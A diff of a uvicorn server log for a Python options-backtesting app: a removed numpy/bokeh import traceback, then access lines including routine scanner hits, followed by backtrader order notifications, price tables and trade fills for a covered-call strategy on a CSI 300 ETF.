@@ -1,80 +1,1675 @@
 INFO:     Will watch for changes in these directories: ['/home/clive/rongqf/backtest']
 INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
-INFO:     Started reloader process [3898877] using StatReload
-Process SpawnProcess-1:
-Traceback (most recent call last):
-  File "/home/clive/miniconda3/lib/python3.13/multiprocessing/process.py", line 313, in _bootstrap
-    self.run()
-    ~~~~~~~~^^
-  File "/home/clive/miniconda3/lib/python3.13/multiprocessing/process.py", line 108, in run
-    self._target(*self._args, **self._kwargs)
-    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/uvicorn/_subprocess.py", line 80, in subprocess_started
-    target(sockets=sockets)
-    ~~~~~~^^^^^^^^^^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/uvicorn/server.py", line 67, in run
-    return asyncio.run(self.serve(sockets=sockets))
-           ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/asyncio/runners.py", line 195, in run
-    return runner.run(main)
-           ~~~~~~~~~~^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/asyncio/runners.py", line 118, in run
-    return self._loop.run_until_complete(task)
-           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
-    return future.result()
-           ~~~~~~~~~~~~~^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/uvicorn/server.py", line 71, in serve
-    await self._serve(sockets)
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/uvicorn/server.py", line 78, in _serve
-    config.load()
-    ~~~~~~~~~~~^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/uvicorn/config.py", line 436, in load
-    self.loaded_app = import_from_string(self.app)
-                      ~~~~~~~~~~~~~~~~~~^^^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/uvicorn/importer.py", line 19, in import_from_string
-    module = importlib.import_module(module_str)
-  File "/home/clive/miniconda3/lib/python3.13/importlib/__init__.py", line 88, in import_module
-    return _bootstrap._gcd_import(name[level:], package, level)
-           ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "<frozen importlib._bootstrap>", line 1387, in _gcd_import
-  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
-  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
-  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
-  File "<frozen importlib._bootstrap_external>", line 1026, in exec_module
-  File "<frozen importlib._bootstrap>", line 488, in _call_with_frames_removed
-  File "/home/clive/rongqf/backtest/server.py", line 7, in <module>
-    from core.backtest_engine import StrategyRunner
-  File "/home/clive/rongqf/backtest/core/backtest_engine.py", line 5, in <module>
-    import core.backtesting_runer as bti_runer
-  File "/home/clive/rongqf/backtest/core/backtesting_runer.py", line 12, in <module>
-    from backtesting import Backtest
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/backtesting/__init__.py", line 68, in <module>
-    from . import lib  # noqa: F401
-    ^^^^^^^^^^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/backtesting/lib.py", line 26, in <module>
-    from ._plotting import plot_heatmaps as _plot_heatmaps
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/backtesting/_plotting.py", line 21, in <module>
-    from bokeh.plotting import figure as _figure
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/bokeh/plotting/__init__.py", line 20, in <module>
-    from . import figure as _figure ; _figure
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/bokeh/plotting/figure.py", line 20, in <module>
-    from ..core.properties import (
-    ...<12 lines>...
-    )
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/bokeh/core/properties.py", line 270, in <module>
-    from .property.auto import Auto; Auto
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/bokeh/core/property/auto.py", line 22, in <module>
-    from .enum import Enum
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/bokeh/core/property/enum.py", line 24, in <module>
-    from .primitive import String
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/bokeh/core/property/primitive.py", line 34, in <module>
-    bokeh_bool_types += (np.bool8,)
-                         ^^^^^^^^
-  File "/home/clive/miniconda3/lib/python3.13/site-packages/numpy/__init__.py", line 414, in __getattr__
-    raise AttributeError("module {!r} has no attribute "
-                         "{!r}".format(__name__, attr))
-AttributeError: module 'numpy' has no attribute 'bool8'. Did you mean: 'bool'?
+INFO:     Started reloader process [4173132] using StatReload
+/home/clive/miniconda3/lib/python3.13/site-packages/pyfolio/pos.py:25: UserWarning: Module "zipline.assets" not found; multipliers will not be applied to position notionals.
+  warnings.warn(
+INFO:     Started server process [4173134]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
 可用字体: ['Andale Mono', 'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'DejaVu Sans', 'DejaVu Sans Display', 'DejaVu Sans Mono', 'DejaVu Serif', 'DejaVu Serif Display', 'FontAwesome', 'Georgia', 'Impact', 'Lato', 'Liberation Mono', 'Liberation Sans', 'Liberation Sans Narrow', 'Liberation Serif', 'STIXGeneral', 'STIXNonUnicode', 'STIXSizeFiveSym', 'STIXSizeFourSym', 'STIXSizeOneSym', 'STIXSizeThreeSym', 'STIXSizeTwoSym', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings', 'cmb10', 'cmex10', 'cmmi10', 'cmr10', 'cmss10', 'cmsy10', 'cmtt10', 'dsrom10', 'esint10', 'eufm10', 'msam10', 'msbm10', 'rsfs10', 'stmary10', 'wasy10']
+可用字体: ['Andale Mono', 'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'DejaVu Sans', 'DejaVu Sans Display', 'DejaVu Sans Mono', 'DejaVu Serif', 'DejaVu Serif Display', 'FontAwesome', 'Georgia', 'Impact', 'Lato', 'Liberation Mono', 'Liberation Sans', 'Liberation Sans Narrow', 'Liberation Serif', 'STIXGeneral', 'STIXNonUnicode', 'STIXSizeFiveSym', 'STIXSizeFourSym', 'STIXSizeOneSym', 'STIXSizeThreeSym', 'STIXSizeTwoSym', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings', 'cmb10', 'cmex10', 'cmmi10', 'cmr10', 'cmss10', 'cmsy10', 'cmtt10', 'dsrom10', 'esint10', 'eufm10', 'msam10', 'msbm10', 'rsfs10', 'stmary10', 'wasy10']
+INFO:     183.23.63.155:56007 - "GET / HTTP/1.1" 200 OK
+INFO:     183.23.63.155:56007 - "GET /api/strategies HTTP/1.1" 200 OK
+[{'strategy_name': 'covered_call', 'result_id': '20250924_022434', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T02:24:34.486132', 'html_path': 'results/covered_call/covered_call_20250924_022434.html', 'json_path': 'results/covered_call/covered_call_20250924_022434.json', 'report_path': 'results/covered_call/covered_call_20250924_022434_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_022434_pf_report.html'}, {'strategy_name': 'covered_call', 'result_id': '20250924_015209', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T01:52:09.293785', 'html_path': 'results/covered_call/covered_call_20250924_015209.html', 'json_path': 'results/covered_call/covered_call_20250924_015209.json', 'report_path': 'results/covered_call/covered_call_20250924_015209_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_015209_pf_report.html'}]
+INFO:     183.23.63.155:56008 - "GET /api/records?strategies_name=covered_call HTTP/1.1" 200 OK
+INFO:     183.23.63.155:56007 - "GET /api/strategies/covered_call/params HTTP/1.1" 200 OK
+INFO:     103.183.218.30:56129 - "GET /results/covered_call/covered_call_20250924_022434_report.html HTTP/1.1" 404 Not Found
+INFO:     103.183.218.30:56131 - "GET /results/covered_call/covered_call_20250924_022434_pf_report.html HTTP/1.1" 200 OK
+INFO:     157.55.39.193:21284 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     143.244.128.115:46090 - "GET / HTTP/1.1" 200 OK
+INFO:     143.244.128.115:46098 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     40.124.185.25:34042 - "GET / HTTP/1.1" 200 OK
+INFO:     45.79.115.59:40620 - "GET / HTTP/1.1" 200 OK
+INFO:     172.236.228.227:37496 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.56:37850 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.56:60538 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.56:52270 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.200:48190 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.56:52314 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.200:41086 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.200:41098 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.200:41124 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.200:38198 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.200:38200 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.200:38208 - "GET /security.txt HTTP/1.1" 404 Not Found
+INFO:     167.94.138.56:38442 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.56:38446 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.56:38456 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.164:59140 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     124.217.189.200:52714 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:52716 - "GET /static/bootstrap.min.css HTTP/1.1" 200 OK
+INFO:     124.217.189.200:52716 - "GET /api/strategies HTTP/1.1" 200 OK
+INFO:     124.217.189.200:56970 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     124.217.189.200:52716 - "GET /api/strategies/covered_call/params HTTP/1.1" 200 OK
+[{'strategy_name': 'covered_call', 'result_id': '20250924_022434', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T02:24:34.486132', 'html_path': 'results/covered_call/covered_call_20250924_022434.html', 'json_path': 'results/covered_call/covered_call_20250924_022434.json', 'report_path': 'results/covered_call/covered_call_20250924_022434_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_022434_pf_report.html'}, {'strategy_name': 'covered_call', 'result_id': '20250924_015209', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T01:52:09.293785', 'html_path': 'results/covered_call/covered_call_20250924_015209.html', 'json_path': 'results/covered_call/covered_call_20250924_015209.json', 'report_path': 'results/covered_call/covered_call_20250924_015209_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_015209_pf_report.html'}]
+INFO:     124.217.189.200:56971 - "GET /api/records?strategies_name=covered_call HTTP/1.1" 200 OK
+strategies.covered_call
+['CoveredCall', 'DataFeed', 'PandasData', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'backengine', 'bt', 'os', 'paramecfg', 'pd']
+CoveredCall
+       code              name   asset  ...   unit   maturity  settle_date
+0  90005479   沪深300ETF购9月3300  159919  ...  10000 2025-09-24   2025-09-29
+1  90005480   沪深300ETF购9月3400  159919  ...  10000 2025-09-24   2025-09-29
+2  90005481   沪深300ETF购9月3500  159919  ...  10000 2025-09-24   2025-09-29
+3  90005079  沪深300ETF购9月3542A  159919  ...  10000 2025-09-24   2025-09-29
+4  90005365   沪深300ETF购9月3600  159919  ...  10000 2025-09-24   2025-09-29
+
+[5 rows x 8 columns]
+       code       date    open    high     low   close  volume
+0  90005479 2025-04-08  0.4916  0.4953  0.4800  0.4953     122
+1  90005479 2025-04-09  0.4795  0.5155  0.4795  0.5155     222
+2  90005479 2025-04-10  0.5774  0.5774  0.5774  0.5774       6
+3  90005479 2025-04-11  0.5628  0.5949  0.5628  0.5949     178
+4  90005479 2025-04-14  0.5988  0.5988  0.5988  0.5988       2
+           date   open   high    low  close      volume
+3118 2025-03-31  4.050  4.090  4.002  4.020   176738675
+3119 2025-04-01  4.023  4.039  4.013  4.019    64945083
+3120 2025-04-02  4.020  4.033  4.007  4.015   107632509
+3121 2025-04-03  3.987  4.017  3.978  3.994   194258574
+3122 2025-04-07  3.828  3.874  3.625  3.730  1652640182
+next 2025-01-23
+==================================================
+****************************************************************************************************
+notify_order Ref: 1
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739505.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 2
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739506.9999999999
+Info: AutoOrderedDict({'ticker': '90006077'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 1
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739505.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 2
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739506.9999999999
+Info: AutoOrderedDict({'ticker': '90006077'})
+Broker: None
+Alive: True
+next 2025-01-24
+next 2025-01-27
+next 2025-02-05
+==================================================
+****************************************************************************************************
+notify_order Ref: 3
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739505.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 4
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739506.9999999999
+Info: AutoOrderedDict({'ticker': '90006077'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 3
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739505.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 4
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739506.9999999999
+Info: AutoOrderedDict({'ticker': '90006077'})
+Broker: None
+Alive: True
+next 2025-02-06
+next 2025-02-07
+next 2025-02-10
+next 2025-02-11
+next 2025-02-12
+next 2025-02-13
+next 2025-02-14
+next 2025-02-17
+next 2025-02-18
+next 2025-02-19
+next 2025-02-20
+next 2025-02-21
+next 2025-02-24
+next 2025-02-25
+next 2025-02-26
+next 2025-02-27
+next 2025-02-28
+next 2025-03-03
+==================================================
+****************************************************************************************************
+notify_order Ref: 5
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739505.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 6
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739506.9999999999
+Info: AutoOrderedDict({'ticker': '90006077'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 5
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739505.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 6
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739506.9999999999
+Info: AutoOrderedDict({'ticker': '90006077'})
+Broker: None
+Alive: True
+next 2025-03-04
+next 2025-03-05
+next 2025-03-06
+next 2025-03-07
+next 2025-03-10
+next 2025-03-11
+next 2025-03-12
+next 2025-03-13
+next 2025-03-14
+next 2025-03-17
+next 2025-03-18
+next 2025-03-19
+next 2025-03-20
+next 2025-03-21
+next 2025-03-24
+next 2025-03-25
+next 2025-03-26
+next 2025-03-27
+next 2025-03-28
+next 2025-03-31
+next 2025-04-01
+==================================================
+****************************************************************************************************
+notify_order Ref: 7
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739342.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 8
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739341.9999999999
+Info: AutoOrderedDict({'ticker': '90005085'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 7
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739342.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 8
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739341.9999999999
+Info: AutoOrderedDict({'ticker': '90005085'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 7
+OrdType: 0
+OrdType: Buy
+Status: 4
+Status: Completed
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739342.9999999999
+Info: AutoOrderedDict({'ticker': '159919'})
+Broker: None
+Alive: False
+2025-04-02  Buy/Sell 159919, Price: 4.0200, Size:  10000, Cost: 40200.0000, Comm 80.4000
+****************************************************************************************************
+notify_order Ref: 8
+OrdType: 1
+OrdType: Sell
+Status: 4
+Status: Completed
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739341.9999999999
+Info: AutoOrderedDict({'ticker': '90005085'})
+Broker: None
+Alive: False
+2025-04-02  Buy/Sell 90005085, Price: 0.1471, Size: -10000, Cost: -1471.0000, Comm 2.9420
+next 2025-04-02
+next 2025-04-03
+next 2025-04-07
+next 2025-04-08
+next 2025-04-09
+next 2025-04-10
+next 2025-04-11
+next 2025-04-14
+next 2025-04-15
+next 2025-04-16
+next 2025-04-17
+next 2025-04-18
+next 2025-04-21
+next 2025-04-22
+next 2025-04-23
+next 2025-04-24
+next 2025-04-25
+next 2025-04-28
+next 2025-04-29
+next 2025-04-30
+next 2025-05-06
+****************************************************************************************************
+notify_order Ref: 9
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739377.9999999999
+Info: AutoOrderedDict({'ticker': '90005085'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 10
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739377.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 9
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739377.9999999999
+Info: AutoOrderedDict({'ticker': '90005085'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 10
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739377.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 9
+OrdType: 0
+OrdType: Buy
+Status: 4
+Status: Completed
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739377.9999999999
+Info: AutoOrderedDict({'ticker': '90005085'})
+Broker: None
+Alive: False
+2025-05-07  Buy/Sell 90005085, Price: 0.0879, Size:  10000, Cost: -1471.0000, Comm 1.7580
+****************************************************************************************************
+notify_order Ref: 10
+OrdType: 1
+OrdType: Sell
+Status: 4
+Status: Completed
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739377.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: False
+2025-05-07  Buy/Sell 90005556, Price: 0.1083, Size: -10000, Cost: -1083.0000, Comm 2.1660
+next 2025-05-07
+next 2025-05-08
+next 2025-05-09
+next 2025-05-12
+next 2025-05-13
+next 2025-05-14
+next 2025-05-15
+next 2025-05-16
+next 2025-05-19
+next 2025-05-20
+next 2025-05-21
+next 2025-05-22
+next 2025-05-23
+next 2025-05-26
+next 2025-05-27
+next 2025-05-28
+next 2025-05-29
+next 2025-05-30
+next 2025-06-03
+****************************************************************************************************
+notify_order Ref: 11
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739405.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 12
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739405.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 11
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739405.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 12
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739405.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 11
+OrdType: 0
+OrdType: Buy
+Status: 4
+Status: Completed
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739405.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: False
+2025-06-04  Buy/Sell 90005556, Price: 0.0906, Size:  10000, Cost: -1083.0000, Comm 1.8120
+****************************************************************************************************
+notify_order Ref: 12
+OrdType: 1
+OrdType: Sell
+Status: 4
+Status: Completed
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739405.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: False
+2025-06-04  Buy/Sell 90005556, Price: 0.0906, Size: -10000, Cost: -906.0000, Comm 1.8120
+next 2025-06-04
+next 2025-06-05
+next 2025-06-06
+next 2025-06-09
+next 2025-06-10
+next 2025-06-11
+next 2025-06-12
+next 2025-06-13
+next 2025-06-16
+next 2025-06-17
+next 2025-06-18
+next 2025-06-19
+next 2025-06-20
+next 2025-06-23
+next 2025-06-24
+next 2025-06-25
+next 2025-06-26
+next 2025-06-27
+next 2025-06-30
+next 2025-07-01
+****************************************************************************************************
+notify_order Ref: 13
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739433.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 14
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739433.9999999999
+Info: AutoOrderedDict({'ticker': '90005591'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 13
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739433.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 14
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739433.9999999999
+Info: AutoOrderedDict({'ticker': '90005591'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 13
+OrdType: 0
+OrdType: Buy
+Status: 4
+Status: Completed
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739433.9999999999
+Info: AutoOrderedDict({'ticker': '90005556'})
+Broker: None
+Alive: False
+2025-07-02  Buy/Sell 90005556, Price: 0.1178, Size:  10000, Cost: -906.0000, Comm 2.3560
+****************************************************************************************************
+notify_order Ref: 14
+OrdType: 1
+OrdType: Sell
+Status: 4
+Status: Completed
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739433.9999999999
+Info: AutoOrderedDict({'ticker': '90005591'})
+Broker: None
+Alive: False
